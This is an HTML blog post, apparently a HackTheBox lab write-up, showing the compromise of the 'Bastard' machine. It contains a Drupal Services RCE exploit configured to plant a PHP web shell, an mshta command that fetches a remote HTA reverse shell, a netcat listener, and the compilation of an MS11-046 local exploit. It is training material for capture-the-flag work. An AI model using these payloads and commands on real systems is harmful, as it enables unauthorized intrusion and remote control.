@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Bastard | Initial Nmap ┌─[m4rc0@SittingDucks]─[~/Documents/htb] └──╼ $nmap -sV -sC -p- 10.10.10.9 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Bastard</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-04-07 22:06:00+01:00">Tue 07 April 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Bastard.html">Bastard</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Bastard.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1 id="initial-nmap">Initial Nmap</h1>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb]</span>
+<span class="go">└──╼ $nmap -sV -sC -p- 10.10.10.9</span>
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 22:04 BST</span>
+<span class="go">Nmap scan report for 10.10.10.9</span>
+<span class="go">Host is up (0.097s latency).</span>
+<span class="go">Not shown: 65532 filtered ports</span>
+<span class="go">PORT      STATE SERVICE VERSION</span>
+<span class="go">80/tcp    open  http    Microsoft IIS httpd 7.5</span>
+<span class="go">|_http-generator: Drupal 7 (http://drupal.org)</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Potentially risky methods: TRACE</span>
+<span class="go">| http-robots.txt: 36 disallowed entries (15 shown)</span>
+<span class="go">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span>
+<span class="go">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span>
+<span class="go">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span>
+<span class="go">|_/LICENSE.txt /MAINTAINERS.txt</span>
+<span class="go">|_http-server-header: Microsoft-IIS/7.5</span>
+<span class="go">|_http-title: Welcome to 10.10.10.9 | 10.10.10.9</span>
+<span class="go">135/tcp   open  msrpc   Microsoft Windows RPC</span>
+<span class="go">49154/tcp open  msrpc   Microsoft Windows RPC</span>
+<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 321.27 seconds</span>
+</pre></div>
+
+
+<p>From the nmap output we understand there is an IIS web server v7.5 running on port 80. Therefore we can deduct we are dealing with a Windows machine. A quick search on <a href="https://wpscan.org/">Wikipedia</a> tells us that IIS 7.5 IIS 7.5 was included in Windows 7 and Windows Server 2008 R2, so we are potentially deailng with one of these versions. </p>
+<p>Nmap also reveals that Drupal 7 (a popular cms) is running on IIS. Browing the websites gives this result:</p>
+<p><img alt="" src="../images/bastard-drupal.png"></p>
+<p>I also check the robots.txt file at http://10.10.10.9/robots.txt which pointed me to look at the http://10.10.10.9/CHANGELOG.txt which confirmed Drupal version is 7.54:</p>
+<div class="highlight"><pre><span></span><span class="go">Drupal 7.54, 2017-02-01</span>
+<span class="go">-----------------------</span>
+<span class="go">- Modules are now able to define theme engines (API addition:</span>
+<span class="go">  https://www.drupal.org/node/2826480).</span>
+<span class="go">- Logging of searches can now be disabled (new option in the administrative</span>
+<span class="go">  interface).</span>
+<span class="go">- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()</span>
+<span class="go">  (API addition: https://www.drupal.org/node/2827134).</span>
+<span class="go">- Added new function for determining whether an HTTPS request is being served</span>
+<span class="go">  (API addition: https://www.drupal.org/node/2824590).</span>
+<span class="go">- Fixed incorrect default value for short and medium date formats on the date</span>
+<span class="go">  type configuration page.</span>
+<span class="go">- File validation error message is now removed after subsequent upload of valid</span>
+<span class="go">  file.</span>
+<span class="go">- Numerous bug fixes.</span>
+<span class="go">- Numerous API documentation improvements.</span>
+<span class="go">- Additional performance improvements.</span>
+<span class="go">- Additional automated test coverage.</span>
+</pre></div>
+
+
+<p>Before doing any kind of manual scanning it's always best practice to look for known exaploits which can save us precious time. Looking for Drupal exploits with searchsploit cli we have this:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb]</span>
+<span class="go">└──╼ $searchsploit drupal 7</span>
+<span class="go">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="go"> Exploit Title                                                                                                                                                                                          |  Path</span>
+<span class="go">                                                                                                                                                                                                        | (/usr/share/exploitdb/)</span>
+<span class="go">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="go">Drupal 4.7 - &#39;Attachment mod_mime&#39; Remote Command Execution                                                                                                                                             | exploits/php/webapps/1821.php</span>
+<span class="go">Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                                                                           | exploits/php/webapps/27020.txt</span>
+<span class="go">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Add Admin User)                                                                                                                                       | exploits/php/webapps/34992.py</span>
+<span class="go">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Admin Session)                                                                                                                                        | exploits/php/webapps/44355.php</span>
+<span class="go">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (1)                                                                                                                             | exploits/php/webapps/34984.py</span>
+<span class="go">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (PoC) (Reset Password) (2)                                                                                                                             | exploits/php/webapps/34993.php</span>
+<span class="go">Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Remote Code Execution)                                                                                                                                | exploits/php/webapps/35150.php</span>
+<span class="go">Drupal 7.12 - Multiple Vulnerabilities                                                                                                                                                                  | exploits/php/webapps/18564.txt</span>
+<span class="go">Drupal 7.x Module Services - Remote Code Execution                                                                                                                                                      | exploits/php/webapps/41564.php</span>
+<span class="go">Drupal &lt; 4.7.6 - Post Comments Remote Command Execution                                                                                                                                                 | exploits/php/webapps/3313.pl</span>
+<span class="go">Drupal &lt; 5.22/6.16 - Multiple Vulnerabilities                                                                                                                                                           | exploits/php/webapps/33706.txt</span>
+<span class="go">Drupal &lt; 7.34 - Denial of Service                                                                                                                                                                       | exploits/php/dos/35415.txt</span>
+<span class="go">Drupal &lt; 7.58 - &#39;Drupalgeddon3&#39; (Authenticated) Remote Code (Metasploit)                                                                                                                                | exploits/php/webapps/44557.rb</span>
+<span class="go">Drupal &lt; 7.58 - &#39;Drupalgeddon3&#39; (Authenticated) Remote Code Execution (PoC)                                                                                                                             | exploits/php/webapps/44542.txt</span>
+<span class="go">Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution                                                                                                                     | exploits/php/webapps/44449.rb</span>
+<span class="go">Drupal Module CKEditor &lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                                                                  | exploits/php/webapps/25493.txt</span>
+<span class="go">Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                                                           | exploits/php/remote/40144.php</span>
+<span class="go">Drupal Module Cumulus 5.x-1.1/6.x-1.4 - &#39;tagcloud&#39; Cross-Site Scripting                                                                                                                                 | exploits/php/webapps/35397.txt</span>
+<span class="go">Drupal Module Drag &amp; Drop Gallery 6.x-1.5 - &#39;upload.php&#39; Arbitrary File Upload                                                                                                                          | exploits/php/webapps/37453.php</span>
+<span class="go">Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                                                                            | exploits/php/webapps/35072.txt</span>
+<span class="go">Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                                                                       | exploits/php/remote/40130.rb</span>
+<span class="go">Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                                                                       | exploits/php/webapps/44501.txt</span>
+<span class="go">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span>
+<span class="go">Shellcodes: No Result</span>
+</pre></div>
+
+
+<p>i think "Drupal 7.x Module Services - Remote Code Execution  --&gt;  exploits/php/webapps/41564.php" is the intended exploit simply because it was available when the box was released in 2017 whereas the other relevant exploits were not. Looking at the code of the exploit I can see there is a quick summary of what it does:</p>
+<ol>
+<li>Use the SQL Injection to get the contents of the cache for current
+endpoint along with admin credentials and hash</li>
+<li>Alter the cache to allow us to write a file and do so</li>
+<li>Restore the cache</li>
+</ol>
+<p>There are also some details we have to feed in the script:</p>
+<div class="highlight"><pre><span></span><span class="x">$url = &#39;http://vmweb.lan/drupal-7.54&#39;;</span>
+<span class="x">$endpoint_path = &#39;/rest_endpoint&#39;;</span>
+<span class="x">$endpoint = &#39;rest_endpoint&#39;;</span>
+
+<span class="x">$file = [</span>
+<span class="x">    &#39;filename&#39; =&gt; &#39;dixuSOspsOUU.php&#39;,</span>
+<span class="x">    &#39;data&#39; =&gt; &#39;</span><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">\</span><span class="s1">&#39;php://input\&#39;)); ?&gt;&#39;</span>
+<span class="p">];</span>
+</pre></div>
+
+
+<p>We know the URL but we need to find the rest endpoint and its path. Being lost for a little while I decided to go ahead with my usual next enumeration step, that is directory scanning. Using <code>gobuster</code> I scan until I found <code>/rest</code> (it took ages):</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]                                                                                                                                                                                                </span>
+<span class="go">└──╼ $gobuster dir --url http://10.10.10.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                                                       </span>
+<span class="go">===============================================================                                                                                                                                                                                  </span>
+<span class="go">Gobuster v3.0.1                                                                                                                                                                                                                                  </span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)                                                                                                                                                                                  </span>
+<span class="go">===============================================================                                                                                                                                                                                  </span>
+<span class="go">[+] Url:            http://10.10.10.9                                                                                                                                                                                                            </span>
+<span class="go">[+] Threads:        10                                                                                                                                                                                                                           </span>
+<span class="go">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                                                                                 </span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                                                                                  </span>
+<span class="go">[+] User Agent:     gobuster/3.0.1                                                                                                                                                                                                               </span>
+<span class="go">[+] Timeout:        10s                                                                                                                                                                                                                          </span>
+<span class="go">===============================================================                                                                                                                                                                                  </span>
+<span class="go">2020/04/08 19:19:33 Starting gobuster                                                                                                                                                                                                            </span>
+<span class="go">===============================================================                                                                                                                                                                                  </span>
+<span class="go">/search (Status: 403)                                           </span>
+<span class="go">/misc (Status: 301)                                               </span>
+<span class="go">/themes (Status: 301)</span>
+
+<span class="go">/0 (Status: 200)                                                                                                                                                                                                                                 </span>
+<span class="go">/user (Status: 200)                                                                                                                                                                                                                              </span>
+<span class="go">/modules (Status: 301)                                                                                     </span>
+<span class="go">/admin (Status: 403)                                                                                                                                                                                                                             </span>
+<span class="go">/scripts (Status: 301)                                     </span>
+<span class="go">/node (Status: 200)                                                                                                                                                                                                                              </span>
+<span class="go">/tag (Status: 403)                                                                                                                                                                                                                               </span>
+<span class="go">/Search (Status: 403)                                                                                                                                                                                                                            </span>
+<span class="go">/sites (Status: 301)                                                                                                                                                                                                                             </span>
+<span class="go">/template (Status: 403)                                                                                                                                                                                                                          </span>
+<span class="go">/includes (Status: 301)                                                                                                                                                                                                                          </span>
+<span class="go">/profiles (Status: 301) </span>
+<span class="go">/rest (Status: 200)</span>
+
+<span class="go">&lt;SNIP&gt;    &lt;SNIP&gt;     &lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>and when I browsed to that file I see this:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $curl http://10.10.10.9/rest</span>
+<span class="go">Services Endpoint &quot;rest_endpoint&quot; has been setup successfully.</span>
+</pre></div>
+
+
+<p>So it looks like we found the rest endpoint name and path so we will replace the details of the script as below:</p>
+<div class="highlight"><pre><span></span><span class="x">$url = &#39;http://10.10.10.9&#39;;</span>
+<span class="x">$endpoint_path = &#39;/rest&#39;;</span>
+<span class="x">$endpoint = &#39;rest_endpoint&#39;;</span>
+
+<span class="x">$file = [</span>
+<span class="x">    &#39;filename&#39; =&gt; &#39;41564.php&#39;,</span>
+<span class="x">    &#39;data&#39; =&gt; &#39;</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;</span>
+</pre></div>
+
+
+<p>I executed the script but I got an error which after some research I found I had to install <code>php-curl</code>. Another error was related to the fact that a comment at line 15 and another at line 70 of the script had wrapped onto the next line. I fixed both issues and ran the script again:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $php 41564.php </span>
+<span class="gp">#</span> Exploit Title: Drupal <span class="m">7</span>.x Services Module Remote Code Execution
+<span class="gp">#</span> Vendor Homepage: https://www.drupal.org/project/services
+<span class="gp">#</span> Exploit Author: Charles FOL
+<span class="gp">#</span> Contact: https://twitter.com/ambionics 
+<span class="gp">#</span> Website: https://www.ambionics.io/blog/drupal-services-module-rce
+
+
+<span class="gp">#</span>!/usr/bin/php
+<span class="go">Stored session information in session.json</span>
+<span class="go">Stored user information in user.json</span>
+<span class="go">Cache contains 7 entries</span>
+<span class="go">File written: http://10.10.10.9/41564.php</span>
+</pre></div>
+
+
+<p>So if the script did its job I should have remote execution through the piece of code we added to the script, that is <code>&lt;?php system($_REQUEST["cmd"]); ?&gt;</code>.</p>
+<p>Indeed, I am able to run commands in the victim box, such as <code>whoami</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $curl http://10.10.10.9/41564.php?cmd=whoami</span>
+<span class="go">nt authority\iusr</span>
+</pre></div>
+
+
+<p>or <code>systeminfo</code></p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $curl http://10.10.10.9/41564.php?cmd=systeminfo</span>
+
+<span class="go">Host Name:                 BASTARD</span>
+<span class="go">OS Name:                   Microsoft Windows Server 2008 R2 Datacenter </span>
+<span class="go">OS Version:                6.1.7600 N/A Build 7600</span>
+<span class="go">OS Manufacturer:           Microsoft Corporation</span>
+<span class="go">OS Configuration:          Standalone Server</span>
+<span class="go">OS Build Type:             Multiprocessor Free</span>
+<span class="go">Registered Owner:          Windows User</span>
+<span class="go">Registered Organization:   </span>
+<span class="go">Product ID:                00496-001-0001283-84782</span>
+<span class="go">Original Install Date:     18/3/2017, 7:04:46 </span>
+<span class="go">System Boot Time:          7/4/2020, 11:30:09 </span>
+<span class="go">System Manufacturer:       VMware, Inc.</span>
+<span class="go">System Model:              VMware Virtual Platform</span>
+<span class="go">System Type:               x64-based PC</span>
+<span class="go">Processor(s):              2 Processor(s) Installed.</span>
+<span class="go">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="go">                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="go">BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018</span>
+<span class="go">Windows Directory:         C:\Windows</span>
+<span class="go">System Directory:          C:\Windows\system32</span>
+<span class="go">Boot Device:               \Device\HarddiskVolume1</span>
+<span class="go">System Locale:             el;Greek</span>
+<span class="go">Input Locale:              en-us;English (United States)</span>
+<span class="go">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span>
+<span class="go">Total Physical Memory:     2.047 MB</span>
+<span class="go">Available Physical Memory: 1.525 MB</span>
+<span class="go">Virtual Memory: Max Size:  4.095 MB</span>
+<span class="go">Virtual Memory: Available: 3.551 MB</span>
+<span class="go">Virtual Memory: In Use:    544 MB</span>
+<span class="go">Page File Location(s):     C:\pagefile.sys</span>
+<span class="go">Domain:                    HTB</span>
+<span class="go">Logon Server:              N/A</span>
+<span class="go">Hotfix(s):                 N/A</span>
+<span class="go">Network Card(s):           1 NIC(s) Installed.</span>
+<span class="go">                           [01]: Intel(R) PRO/1000 MT Network Connection</span>
+<span class="go">                                 Connection Name: Local Area Connection</span>
+<span class="go">                                 DHCP Enabled:    No</span>
+<span class="go">                                 IP address(es)</span>
+<span class="go">                                 [01]: 10.10.10.9</span>
+</pre></div>
+
+
+<p>At this point, I want to get a full shell on my box so I use a Living Off The Land tactic, that is <a href="https://lolbas-project.github.io/lolbas/Binaries/Mshta/"><code>mshta</code></a>. To do this I download a python script called <a href="https://github.com/felamos/weirdhta">weirdhta</a>.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Tools/weirdhta]</span>
+<span class="go">└──╼ $./weirdhta.py </span>
+
+<span class="go"> █     █░▓█████  ██▓ ██▀███  ▓█████▄     ██░ ██ ▄▄▄█████▓ ▄▄▄</span>
+<span class="go">▓█░ █ ░█░▓█   ▀ ▓██▒▓██ ▒ ██▒▒██▀ ██▌   ▓██░ ██▒▓  ██▒ ▓▒▒████▄</span>
+<span class="go">▒█░ █ ░█ ▒███   ▒██▒▓██ ░▄█ ▒░██   █▌   ▒██▀▀██░▒ ▓██░ ▒░▒██  ▀█▄</span>
+<span class="go">░█░ █ ░█ ▒▓█  ▄ ░██░▒██▀▀█▄  ░▓█▄   ▌   ░▓█ ░██ ░ ▓██▓ ░ ░██▄▄▄▄██</span>
+<span class="go">░░██▒██▓ ░▒████▒░██░░██▓ ▒██▒░▒████▓    ░▓█▒░██▓  ▒██▒ ░  ▓█   ▓██▒</span>
+<span class="go">░ ▓░▒ ▒  ░░ ▒░ ░░▓  ░ ▒▓ ░▒▓░ ▒▒▓  ▒     ▒ ░░▒░▒  ▒ ░░    ▒▒   ▓▒█░</span>
+<span class="go">  ▒ ░ ░   ░ ░  ░ ▒ ░  ░▒ ░ ▒░ ░ ▒  ▒     ▒ ░▒░ ░    ░      ▒   ▒▒ ░</span>
+<span class="go">  ░   ░     ░    ▒ ░  ░░   ░  ░ ░  ░     ░  ░░ ░  ░        ░   ▒</span>
+<span class="go">    ░       ░  ░ ░     ░        ░        ░  ░  ░               ░  ░</span>
+<span class="go">                              ░</span>
+<span class="go">                                                    by felamos</span>
+
+
+<span class="go">1) Powershell Reverse Shell.</span>
+<span class="go">2) Custom Command.</span>
+
+<span class="gp">&gt;</span> <span class="m">1</span> 
+<span class="go">[*] Enter IP Address: 10.10.14.61</span>
+<span class="go">[*] Enter PORT: 443</span>
+<span class="go">[*] Written test.hta</span>
+</pre></div>
+
+
+<p>Once I run the tool it asks for an IP and a port. I provide the IP of my attacking machine and port 443. This will create a payload, test.hta, which if executed on the victim machine would give us a shell back on my ParrotOS box.</p>
+<p>So I start a simple python http server in the directory where the test.hta file is located:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Tools/weirdhta]</span>
+<span class="go">└──╼ $sudo python -m SimpleHTTPServer</span>
+<span class="go">[sudo] password for m4rc0: </span>
+<span class="go">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</pre></div>
+
+
+<p>then I start a netcat listener on port 443 and I launch the following command:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Tools/weirdhta]</span>
+<span class="go">└──╼ $curl http://10.10.10.9/41564.php?cmd=&#39;C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta&#39; -v</span>
+<span class="go">*   Trying 10.10.10.9:80...</span>
+<span class="go">* TCP_NODELAY set</span>
+<span class="go">* Connected to 10.10.10.9 (10.10.10.9) port 80 (#0)</span>
+<span class="gp">&gt;</span> GET /41564.php?cmd<span class="o">=</span>C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta HTTP/1.1
+<span class="gp">&gt;</span> Host: <span class="m">10</span>.10.10.9
+<span class="gp">&gt;</span> User-Agent: curl/7.68.0
+<span class="gp">&gt;</span> Accept: */*
+<span class="gp">&gt;</span> 
+<span class="go">* Mark bundle as not supporting multiuse</span>
+<span class="go">&lt; HTTP/1.1 200 OK</span>
+<span class="go">&lt; Content-Type: text/html</span>
+<span class="go">&lt; Server: Microsoft-IIS/7.5</span>
+<span class="go">&lt; X-Powered-By: PHP/5.3.28</span>
+<span class="go">&lt; X-Powered-By: ASP.NET</span>
+<span class="go">&lt; Date: Thu, 09 Apr 2020 05:27:41 GMT</span>
+<span class="go">&lt; Content-Length: 0</span>
+<span class="go">&lt; </span>
+<span class="go">* Connection #0 to host 10.10.10.9 left intact</span>
+</pre></div>
+
+
+<p>where the <code>C%3A%2FWindows%2FSystem32%2Fmshta.exe+http%3A%2F%2F10.10.14.61%3A8000%2Ftest.hta</code> is the URL encoded part for <code>C:\Windows\System32\mshta.exe http://10.10.14.61:8000/test.hta</code>.</p>
+<p>The netcat listener I had started shows I got a shell successfully:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $sudo nc -lvnp 443</span>
+<span class="go">[sudo] password for m4rc0: </span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.61] from (UNKNOWN) [10.10.10.9] 49484</span>
+<span class="go">Client Connected...</span>
+
+<span class="go">PS C:\inetpub\drupal-7.54&gt; </span>
+</pre></div>
+
+
+<p>Looking around I see there is a user folder called <code>dimitris</code> and i found the user.txt in the Desktop:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\Users\dimitris\Desktop&gt; cat user.txt</span>
+<span class="go">ba****************************a2</span>
+</pre></div>
+
+
+<p>Now we need to find be able to read the root.txt which requires us to be Administrator. </p>
+<p>From the <code>systeminfo</code> command I had previously ran I see that the OS version is <code>6.1.7600 N/A Build 7600</code> which is exactly the same version of another box I had recently exploited, that is <a href="https://sittingducks.io/Devel.html">Devel</a>. Furthemore, the <code>systeminfo</code> suggests that the Windows machine does not have any hotfixes installed. For this Windows version we can use exploit 40564 from exploitdb. So I repeat the same procedure with the only difference that this time the target system is a x64 bit architecture. Because of this instead of running <code>i686-w64-mingw32-gcc</code> I run <code>x86_64-w64-mingw32-gcc</code> to compile the "C" program.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $x86_64-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32</span>
+<span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $ll</span>
+<span class="go">total 376K</span>
+<span class="go">-rw-r--r-- 1 m4rc0 m4rc0  32K Apr  9 07:32 40564.c</span>
+<span class="go">-rw-r--r-- 1 m4rc0 m4rc0 8.5K Apr  8 19:43 41564.php</span>
+<span class="go">-rwxr-xr-x 1 m4rc0 m4rc0 323K Apr  9 08:06 MS11-046.exe</span>
+<span class="go">-rw-r--r-- 1 m4rc0 m4rc0  187 Apr  8 19:45 session.json</span>
+<span class="go">-rw-r--r-- 1 m4rc0 m4rc0  799 Apr  8 19:45 user.json</span>
+</pre></div>
+
+
+<p>Now that I have the exe file I can upload it to the victim machine using another Windows built-in tool, that is <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/#download"><code>certutil.exe</code></a>. To do that I first start a python simple http server in the directory where I have the exe file.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $sudo python -m SimpleHTTPServer</span>
+<span class="go">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</pre></div>
+
+
+<p>Then</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\inetpub\drupal-7.54&gt; ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard]</span>
+<span class="go">└──╼ $sudo nc -lvnp 443</span>
+<span class="go">[sudo] password for m4rc0: </span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.61] from (UNKNOWN) [10.10.10.9] 49585</span>
+<span class="go">Client Connected...</span>
+
